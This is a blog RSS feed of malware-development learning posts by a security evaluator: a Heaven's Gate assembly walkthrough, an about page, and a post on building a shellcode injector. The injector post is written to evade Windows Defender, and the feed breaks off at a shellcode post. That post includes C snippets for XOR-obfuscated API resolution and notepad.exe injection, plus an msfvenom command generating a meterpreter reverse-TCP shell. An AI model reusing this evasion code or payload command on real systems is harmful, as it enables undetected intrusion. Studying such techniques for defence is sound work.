</span></span><span style="display:flex;"><span>	mov edi, [esp]							; EDI is the wow64 <span style="color:#66d9ef">return</span> address
</span></span><span style="display:flex;"><span>	jmp dword far [edx]						; perform the far jump, which will <span style="color:#66d9ef">return</span> to the caller of go_all_native
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>native_x64:
</span></span><span style="display:flex;"><span>[BITS <span style="color:#ae81ff">64</span>]									; we are now executing native x64 code...
</span></span><span style="display:flex;"><span>	xor rax, rax							; zero RAX
</span></span><span style="display:flex;"><span>	push rdi								; save <span style="color:#a6e22e">RDI</span> (EDI being our wow64 <span style="color:#66d9ef">return</span> address)
</span></span><span style="display:flex;"><span>	call rsi								; call our native x64 <span style="color:#a6e22e">function</span> (the param <span style="color:#66d9ef">for</span> our native x64 function is allready in RCX)
</span></span><span style="display:flex;"><span>	pop rdi									; restore <span style="color:#a6e22e">RDI</span> (EDI being our wow64 <span style="color:#66d9ef">return</span> address)
</span></span><span style="display:flex;"><span>	push rax								; simply push it to alloc some space
</span></span><span style="display:flex;"><span>	mov dword [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>], WOW64_CODE_SEGMENT	; set the wow64 code segment 
</span></span><span style="display:flex;"><span>	mov dword [rsp], edi					; set the address we want to jump <span style="color:#a6e22e">to</span> (the <span style="color:#66d9ef">return</span> address from the go_all_native call)
</span></span><span style="display:flex;"><span>	jmp dword far [rsp]						; perform the far jump back to the wow64 caller...
</span></span></code></pre></div><p>The code does the following things:</p>
<ul>
<li>Initializes the stack frame properly.</li>
<li>Takes the pFunction (function to execute) and dwParameter from the stack using EBP + offsets and saves it into registers for later usage.</li>
<li>Calls <code>delta</code>.</li>
<li>In <code>delta</code> we <strong>prepare the opening of the gate</strong>:
<ul>
<li>pop the last inserted value in the stack (which is the saved EIP value, as the call instruction inserts EIP so we keep track of what we have to execute after delta). This is a trick to <strong>obtain the address of the code that is being executed dinamically.</strong></li>
<li>Once we obtain the address of the instruction in which we are dinamically, we add the offset to the native_x64 code section, having the dynamic address of the native_x64 code section.</li>
<li>Expand the stack frame and add 2 variables: The 0x33 code segment, corresponding as a 64-bit execution code segment (this will be used when jumping into 64-bit context), and the dynamic address of native_x64. Both are stored in the stack, the last is pointed by edx, and the other is pointed by edx+4.</li>
<li>Call <code>go_all_native</code>.</li>
</ul>
</li>
<li>In <code>go_all_native</code>, we <strong>go inside the gate</strong>:
<ul>
<li>We save the 32-bit context return address (stored in ESP by the call operation) into edi.</li>
<li>We <strong>perform a far jump to the memory address stored in edx</strong>, which is the <code>native_x64</code> starting point. Also, the edx+4 address is used in the <strong>far jump</strong> to change the code segment to the 0x33 code segment, corresponding to a 64-bit code segment. Now the CPU is ready to understand and execute 64-bit code. <strong>We have opened the Heaven&rsquo;s Gate.</strong></li>
</ul>
</li>
<li>
<ul>
<li>In <code>native_x64</code>, we <strong>execute our x64 arbitrary code and then return to the 32-bit context:</strong>
<ul>
<li>We reset rax.</li>
<li>We push rdi into the stack, as we stored the 32-bit return address in edi. We will use this to return to the 32-bit code.</li>
<li>We call rsi, which already has the pFunction (the address of the function to execute).</li>
<li>Once our function has been executed, we restore rdi popping its value from the stack (we saved it previously).</li>
<li>We add the 32-bit code address into the stack, and the 32-bit code segment (0x23), to, lastly, perform <strong>another far jmp</strong> to the 32-bit address using the 32-bit code segment. We are finally <strong>closing the Heaven&rsquo;s Gate.</strong></li>
</ul>
</li>
</ul>
</li>
<li>After going back to the 32-bit code, some cleaning is done in order to reestructure the stack. We return to the 32-bit code that triggered this shellcode. As a homework, I have to study why the code does some operations for AMD CPUs.</li>
</ul>
<p>To be honest, this has been one of the most interesting topics I have researched within this field. I have learnt a lot from OS internals, assembly and I have not only discovered an interesting technique, but I have understood how does it works (or, at least, I have that impression). I personally do not like to use things that are shady to me, so this is one of the best things to take from this learning path.</p>
<p>Let me know what is wrong or tell me your doubts on this topic by contacting me via <a href="https://www.linkedin.com/in/jacobocasado/?originalSubdomain=es">LinkedIn</a>. I&rsquo;ll be glad to hear from you.</p>
<p>Jaco</p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>Hey!</title>
      <link>http://localhost:1313/about/</link>
      <pubDate>Wed, 28 Feb 2024 20:53:30 +0100</pubDate>
      
      <guid>http://localhost:1313/about/</guid>
      <description><![CDATA[<p>Hello! I am <strong>Jaco</strong>. I love computers and technology in general, and I am currently working as a Cyber Security Evaluator at <a href="https://www.jtsec.es/es">jtsec Beyond IT Security</a>. I created this blog as a way to store my knowledge (my memory is not the best) and as a way to display some of the knowledge I am learning over the time.</p>
<p>In my job, my main expertise field is <strong>web application pentesting</strong>, but I have also evaluated mobile applications and EDRs and I am not scared to learn more about new frameworks, methodologies, tools or systems.</p>
<p>Although this blog is not for a specific topic, I will mainly cover <strong>malware development and OS internals</strong> topics as they are the main topic I like to study when I am not working at my job. In the future, I would like to develop a course covering these topics.</p>
<p>Navigate to the <a href="../posts">Posts</a> section to see all of my work in this platform; you can also contact me in my socials by clicking at the icons on the top.</p>
<p>See you!</p>
<p><em>jaco</em></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>My first steps in MalDev</title>
      <link>http://localhost:1313/posts/firststeps/</link>
      <pubDate>Wed, 28 Feb 2024 20:53:30 +0100</pubDate>
      
      <guid>http://localhost:1313/posts/firststeps/</guid>
      <description><![CDATA[<h2 id="prelude">Prelude</h2>
<p>Around this last month I have been digging into the Malware Development world. I have always wanted to expand my knowledge within this field, and I felt like it was the moment to do so.</p>
<p>As mentioned in many other blogposts, <a href="https://www.google.com/search?client=firefox-b-d&amp;q=sektor7+malware+development">Sektor7 Malware Development Essentials</a> course was a good point to start. Nevertheless, I found this course very short and I felt like most of the important concepts are ignored (e.g., <strong>what is a handle?</strong>) and are just used like if I already know them.</p>
<p>Because of that, I actually recommend <strong>take a little stop on each of the things that the course shows you in order to UNDERSTAND what does each line do</strong> and also do some personal research on each of the things that the course provides.</p>
<p>I personally made questions like:</p>
<ul>
<li>What are the parameters of this function?</li>
<li>Why is this function called in the code?</li>
<li>How could I develop this in a way that it could be more stealthy?</li>
<li>What are these compile options?</li>
</ul>
<p>I wanted to make sure that I really learnt from this course and compiling and execute the code they give you is not the way to do it. I personally recommend to watch their videos, take some notes, and reproduce and execute the code in your personal project files. <strong>Do not be scared to improve or modify the code they give you if you think that can be useful.</strong></p>
<p>The result of following these steps was a final course project in which I included all of the techniques given in the course to avoid detection (mainly static detection, it is a basic course) <strong>combined with am extra technique that made me bypass Windows Defender sandbox analysis.</strong></p>
<p>Please note that I have just started to learn about these things and that I can be wrong; feel free to contact me at any of my social media to improve the quality of this post and my content overall.</p>
<h2 id="evasive-loaderinjector">Evasive? loader/injector</h2>
<p>The final project consists on a <strong>shellcode loader/injector (let&rsquo;s use injector from now on)</strong>.
This shellcode injector <strong>is able to bypass Windows Defender with a meterpreter x64 shellcode at the day of this post (2024/03/05) with Cloud Protection enabled.</strong></p>
<p><strong>EDIT</strong>: A week after this post was created, the dropper is not anymore evasive and is detected (dinamically) by Defender. I personally thought that this dropper is not stealthy enough to be evasive and a lot of evasive measures can (and will) be added to this dropper in the future. This has just started :P</p>
<p>This injector has the following properties:</p>
<ul>
<li>It is an executable (.EXE) program. No DLL version for now.</li>
<li>The shellcode is stored as a resource AND &ldquo;encrypted&rdquo; using XOR.</li>
<li>The Windows API calls are calculated in run-time using the <a href="https://learn.microsoft.com/en-us/windows/win32/dlls/run-time-dynamic-linking">Run-Time Dynamic Linking</a> technique. This corresponds to the <a href="https://unprotect.it/technique/api-obfuscation/">API obfuscation technique</a> from my fellas of Unprotect Project.</li>
<li>The strings to calculate the pointer to the API functions using the aforementioned technique are also encrypted with the same XOR key used for the shellcode, in order to obfuscate the strings.</li>
<li>The XOR key is also stored as a resource in the executable.</li>
<li>The program in which it injects into is <code>notepad.exe</code>. The injector obtains the PID given the process name and uses the PID to inject into.</li>
<li>The program is compiled as a <strong>Windows Subsystem program</strong>, and not as a console program, in order to avoid a CMD popping on screen when the dropper gets executed.</li>
</ul>
<p>The API calls performed in this executable are simple:</p>
<ul>
<li><code>FindResource</code> and <code>LoadResource</code> to obtain the embedded resources in the executable.</li>
<li><code>VirtualAlloc</code>, <code>RtlMoveMemory</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>VirtualProtectEx</code> and <code>CreateRemoteThread</code> for the injection technique.</li>
<li><code>GetProcAddress</code> and <code>GetModuleHandle</code> to perform the IAT hiding technique.</li>
<li><code>CreateToolhelp32Snapshot</code>, <code>Process32First</code> and <code>Process32Next</code> to obtain the PID given a process name.</li>
</ul>
<p>The injector has the following phases:</p>
<ul>
<li>It starts obtaining the XOR key from the resources section of the file.</li>
<li>Using this key to decrypt the string names of the API calls, uses the relevant API functions to obtain the PID from the process name specified as a variable. The process name is hardcoded into the program <strong>as a real malware would do; otherwise, we would need to call this dropper with arguments (not a real case most of the time).</strong> Notepad.exe was used as an example, but it could be performed with more common processes as explorer.exe. Just modify the process name variable inside the dropper.</li>
<li>The dropper allocates memory in <strong>its own process space and stores the shellcode embedded as a resource in this memory region. Note that the shellcode is stored in this region but not executed, as this is an intermediate step to then move the shellcode to the target process.</strong></li>
<li>Using this obtained PID, the injector opens a handle to the process with the given PID and allocates memory space within the process region. The shellcode is then moved from the region that was previously created to this region.</li>
<li>A remote thread pointing to the remote memory region containing the shellcode is started.</li>
</ul>
<p>The result is a thread in the remote process executing our shellcode.</p>
<h2 id="finding-pid-given-process-name">Finding PID given process name</h2>
<p>The used Windows API functions to perform the process injection technique require the PID of the process to inject into. A function that dinamically obtains the PID of a given process name at runtime was implemented in the injector using some of the Windows API calls.</p>
<p>The function is the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">findMyProc</span>(<span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span> procname) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	HANDLE hSnapshot; <span style="color:#75715e">// Handle to the system process snapshot.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	PROCESSENTRY32 pe;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	BOOL hResult;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Searching for the process %ls to get its PID...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, procname);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// snapshot of all processes in the system
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> CreateToolhelp32SnapshotEncrypted[] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0x2A</span>, <span style="color:#ae81ff">0xC4</span>, <span style="color:#ae81ff">0xAB</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x6D</span>, <span style="color:#ae81ff">0xBE</span>, <span style="color:#ae81ff">0x0C</span>, <span style="color:#ae81ff">0x0F</span>, <span style="color:#ae81ff">0xF3</span>, <span style="color:#ae81ff">0xCB</span>, <span style="color:#ae81ff">0xE1</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x98</span>, <span style="color:#ae81ff">0xBA</span>, <span style="color:#ae81ff">0xCF</span>, <span style="color:#ae81ff">0xD0</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0xC9</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x3B</span>, <span style="color:#ae81ff">0x93</span>, <span style="color:#ae81ff">0xA2</span>, <span style="color:#ae81ff">0xB3</span> };
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">XOR</span>(CreateToolhelp32SnapshotEncrypted, <span style="color:#66d9ef">sizeof</span>(CreateToolhelp32SnapshotEncrypted), key, key_len);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">auto</span> <span style="color:#66d9ef">const</span> pCreateToolhelp32Snapshot <span style="color:#f92672">=</span> reinterpret_cast<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">LPVOID</span>(WINAPI<span style="color:#f92672">*</span>)(DWORD dwFlags, DWORD th32ProcessID)<span style="color:#f92672">&gt;</span>(
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">GetProcAddress</span>(hKernel32, (LPCSTR)CreateToolhelp32SnapshotEncrypted)
</span></span><span style="display:flex;"><span>		);
</span></span><span style="display:flex;"><span>	hSnapshot <span style="color:#f92672">=</span> <span style="color:#a6e22e">pCreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hSnapshot <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// It is neccesary to initialize the size of the process entry.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">/* Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32). If you do not initialize dwSize,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	Process32First fails (https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32) */</span>
</span></span><span style="display:flex;"><span>	pe.dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(PROCESSENTRY32W);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Retrieve infrormation about first process encountered in a system snapshot
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> Process32FirstWEncrypted[] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0xC4</span>, <span style="color:#ae81ff">0xA1</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x7B</span>, <span style="color:#ae81ff">0x99</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0xD9</span>, <span style="color:#ae81ff">0xCA</span>, <span style="color:#ae81ff">0xF6</span>, <span style="color:#ae81ff">0x79</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0xFC</span>, <span style="color:#ae81ff">0x88</span> };
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">XOR</span>(Process32FirstWEncrypted, <span style="color:#66d9ef">sizeof</span>(Process32FirstWEncrypted), key, key_len);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">auto</span> <span style="color:#66d9ef">const</span> pProcess32FirstW <span style="color:#f92672">=</span> reinterpret_cast<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">BOOL</span>(WINAPI<span style="color:#f92672">*</span>)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)<span style="color:#f92672">&gt;</span>(
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">GetProcAddress</span>(hKernel32, (LPCSTR)Process32FirstWEncrypted)
</span></span><span style="display:flex;"><span>		);
</span></span><span style="display:flex;"><span>	hResult <span style="color:#f92672">=</span> <span style="color:#a6e22e">pProcess32FirstW</span>(hSnapshot, <span style="color:#f92672">&amp;</span>pe);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Get information about the obtained process using its handle
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// and exit if unsuccessful
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> Process32NextWEncrypted[] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0xC4</span>, <span style="color:#ae81ff">0xA1</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x7B</span>, <span style="color:#ae81ff">0x99</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0xD1</span>, <span style="color:#ae81ff">0xC6</span>, <span style="color:#ae81ff">0xFC</span>, <span style="color:#ae81ff">0x7E</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0xAB</span> };
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">XOR</span>(Process32NextWEncrypted, <span style="color:#66d9ef">sizeof</span>(Process32NextWEncrypted), key, key_len);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">auto</span> <span style="color:#66d9ef">const</span> pProcess32NextW <span style="color:#f92672">=</span> reinterpret_cast<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">BOOL</span>(WINAPI<span style="color:#f92672">*</span>)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)<span style="color:#f92672">&gt;</span>(
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">GetProcAddress</span>(hKernel32, (LPCSTR)Process32NextWEncrypted)
</span></span><span style="display:flex;"><span>		);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">pProcess32NextW</span>(hSnapshot, <span style="color:#f92672">&amp;</span>pe)) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">lstrcmpW</span>(pe.szExeFile, procname) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>			pid <span style="color:#f92672">=</span> pe.th32ProcessID;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Close the open handle; we don&#39;t need it anymore
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">CloseHandle</span>(hSnapshot);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> pid;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Note that this function <strong>will return the first PID occurrence related to the process specified; if there are two process called notepad.exe, it will return the first one that is found in the snapshot obtained calling <code>CreateToolhelp32Snapshot</code></strong> (a lot of factors influence in the first returned PID).</p>
<h2 id="evasion-techniques">Evasion techniques</h2>
<p>Here is a detailed overview of each of the things I implemented in the program to make it stealthier, both statically and dinamically. Overall, I think that it is missing a lot of evasion techniques but as I repeated before, I am just learning slowly to know what I am exactly doing without copypasting.</p>
<h3 id="windows-subsystem">Windows Subsystem</h3>
<p>The program is compiled specifying <code>WINDOWS</code> as the subsystem and not <code>CONSOLE</code> as the subsystem in order to avoid the OS allocating a console when the file is executed.
In order to do this, we first need to compile the file specifying <code>WINDOWS</code> as the <code>SUBSYSTEM</code> FLAG:</p>
<p><img src="/images/post_images/firststeps_1.png" alt=""></p>
<p>After that, the linker will not search for the main function; instead, it will search for the following function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> WINAPI <span style="color:#a6e22e">WinMain</span>(HINSTANCE,HISTANCE,LPSTR,<span style="color:#66d9ef">int</span>);
</span></span></code></pre></div><p>Therefore we must replace our main function with WinMain:
<img src="/images/post_images/firststeps_2.png" alt=""></p>
<h3 id="iat-hiding--encrypted-strings">IAT hiding + encrypted strings</h3>
<p>The API calls are resolved dinamically, therefore, not appearing in the IAT of the file.
Let&rsquo;s see the snippet of the code to obfuscate an API call:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// VirtualAllocEx\0 char array encrypted with the XOR key
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> VirtualAllocExEncrypted[] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0x3F</span>, <span style="color:#ae81ff">0xDF</span>, <span style="color:#ae81ff">0xBC</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x86</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0x0C</span>, <span style="color:#ae81ff">0xF3</span>, <span style="color:#ae81ff">0xCC</span>, <span style="color:#ae81ff">0xE7</span>, <span style="color:#ae81ff">0x4F</span>, <span style="color:#ae81ff">0x6A</span>, <span style="color:#ae81ff">0xAB</span> };
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Decrypting the string
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">XOR</span>(VirtualAllocExEncrypted, <span style="color:#66d9ef">sizeof</span>(VirtualAllocExEncrypted), key, key_len);
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Obtaining the pointer to the VirtualAllocEx function at runtime
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">auto</span> <span style="color:#66d9ef">const</span> pVirtualAllocEx <span style="color:#f92672">=</span> reinterpret_cast<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">LPVOID</span>(WINAPI<span style="color:#f92672">*</span>)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)<span style="color:#f92672">&gt;</span>(
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">GetProcAddress</span>(<span style="color:#a6e22e">GetModuleHandle</span>(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>), (LPCSTR)VirtualAllocExEncrypted)
</span></span><span style="display:flex;"><span>		);
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Calling the function using the pointer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	lpBufferAddress <span style="color:#f92672">=</span> <span style="color:#a6e22e">pVirtualAllocEx</span>(hOpenProcess, NULL, shellcode_len, (MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT), PAGE_EXECUTE_READWRITE);
</span></span></code></pre></div><p>The string is encrypted to not use GetProcAddress and insert the hardcoded &ldquo;<code>VirtualAllocEx</code>&rdquo; function name. <strong>This would result in the function name appearing as a string in the file.</strong>
Given this technique, PE analyzers do not display any information about these calls in the IAT nor in the strings. We can see an example with PExplorer, in which none of the used imports is being shown in the IAT:</p>
<p><img src="/images/post_images/firststeps.png" alt=""></p>
<p>Also, strings related to these calls do not appear in the <code>strings</code> section:</p>
<p><img src="/images/post_images/firststeps_3.png" alt=""></p>
<h2 id="analyzing-the-loader-with-threatcheck">Analyzing the loader with ThreatCheck</h2>
<p><a href="https://github.com/rasta-mouse/ThreatCheck">ThreatCheck</a> is an interesting tool designed by RastaMouse that allows us to <strong>pinpoint the exact bytes that Windows Defender will flag</strong> when scanning the file.</p>
<p>We can use this tool with our loader to verify if Defender flags our file:
<img src="/images/post_images/firststeps_5.png" alt=""></p>
<p>We can see that at first sight Defender does not seem to detect our loader.</p>
<h2 id="used-shellcode">Used shellcode</h2>
<p>The used shellcode is generated from <code>msfvenom</code> and it is a meterpreter reverse TCP shell. The shellcode used is <strong>staged</strong> and that means that it is lighter, but there is a download of the rest of the shellcode after the initial shellcode has been executed.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom --platform windows --arch x64 -p windows/x64/meterpreter_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.0.143 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f raw -o meterpreter EXITFUNC<span style="color:#f92672">=</span>thread
</span></span></code></pre></div><h2 id="defender-bypass-poc">Defender Bypass PoC</h2>
<p>Here is a video using this injector to load the previous shellcode with Defender on. Note that all of the functionalities of Defender are activated but the automatic sample submission (for obvious reasons):</p>
<p><code><video class="video-shortcode" preload="auto" width="100%" controls>
  <source src="/images/post_videos/firststeps_poc.webm" type="video/webm" >
  There should have been a video here but your browser does not seem
  to support it.
</video></code></p>
<p>We can see that no console is being displayed and that it looks stealthy.</p>
<h2 id="future-research-areas">Future research areas</h2>
<p>This post is just the start of a big project I have in hand. The main objective of my project is to understand how OS (specially Windows) works, and how EDR solutions work, in order to understand the most advanced EDR evasion techniques and how can I implement my own techniques to evade EDR using the OS facilities.</p>
<p>I will update this injector when I discover more techniques, but here are some of the possible upgrade areas:</p>
<ul>
<li>Change the injected shellcode for a custom one (IMHO I am far far away from developing a custom shellcode, but I am sure I will do it at the end)</li>
<li>Change the encryption algorithm used to a stronger one (RC6, for example).</li>
<li>Develop the injector in another language (C#, go, nim&hellip;).</li>
<li>Obtain the key to decrypt the resources from a server; this way, without proper connection to the server the injected shellcode does not work (ideal for EDRs that have a offline sandbox environment).</li>
<li>Overall, use more advanced evasion techniques (indirect syscalls, for example).</li>
</ul>
<p>I will start soon Sektor7 Malware Development Intermediate course and start reading Windows Internals book, to complement my knowledge.</p>
<p>I hope you liked reading my post, feel free to contact me at any of my socials for any question/aclaration or just to give me tips, and I hope we see each other soon!</p>
<p><em><strong>jasco</strong></em></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>Random stuff</title>
      <link>http://localhost:1313/posts/random_stuff/</link>
      <pubDate>Wed, 28 Feb 2024 20:53:30 +0100</pubDate>
      
      <guid>http://localhost:1313/posts/random_stuff/</guid>
      <description><![CDATA[<p>Custom function declaration. Used when hooking, to get a pointer to the original function to get it dinamically resolved via IAT and then override this pointer, or to craft a new function that points to a shellcode with the function behavior (used in reflective DLL shellcode)</p>
<p><strong>Case of getting the function pointer to a resolving Windows API call:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">// Declaring the function pointer to a resolving Windows API call
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> (WINAPI<span style="color:#f92672">*</span> pToUnicodeEx) (UINT wVirtKey,  UINT wScanCode, <span style="color:#66d9ef">const</span> BYTE <span style="color:#f92672">*</span>lpKeyState, LPWSTR pwszBuff, <span style="color:#66d9ef">int</span> cchBuff, UINT wFlags, HKL dwhkl) <span style="color:#f92672">=</span> ToUnicodeEx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Call the function using its pointer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>pToUnicodeEx(wVirtKey, wScanCode, lpKeyState, pwszBuff, cchBuff, wFlags, dwhkl);
</span></span></code></pre></div><p><strong>Case of getting the function pointer to a memory zone where the function is implemented via shellcode:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">// Declaring the function pointer to a resolving Windows API call
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">DWORD</span> (WINAPI <span style="color:#f92672">*</span> EXECUTEX64)( X64FUNCTION pFunction, DWORD dwParameter );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Declaring the function pointer instance to NULL
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>EXECUTEX64 pExecuteX64   <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Allocating function for the function pointer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>pExecuteX64 <span style="color:#f92672">=</span> (EXECUTEX64)VirtualAlloc( NULL, <span style="color:#66d9ef">sizeof</span>(sh_executex64), MEM_RESERVE<span style="color:#f92672">|</span>MEM_COMMIT, PAGE_READWRITE );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Copying the shellcode to the function pointer location
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>memcpy( pExecuteX64, sh_executex64, sh_executex64_len );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Call the function using its pointer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>pExecuteX64( pX64function, (DWORD)ctx );
</span></span></code></pre></div>]]></description>
      
    </item>
    
    
    
    <item>
      <title>Shellcodes for everything</title>
      <link>http://localhost:1313/posts/shellcodes/</link>
      <pubDate>Wed, 28 Feb 2024 20:53:30 +0100</pubDate>
      
      <guid>http://localhost:1313/posts/shellcodes/</guid>
      <description><![CDATA[<p>Shellcodes that will be useful for testing/developing your malware.</p>
<p>I usually work on the same OS and with the same Compiler version for better reproducibility so here are my specs:</p>
<ul>
<li>Windows 10 Pro 22H2
<ul>
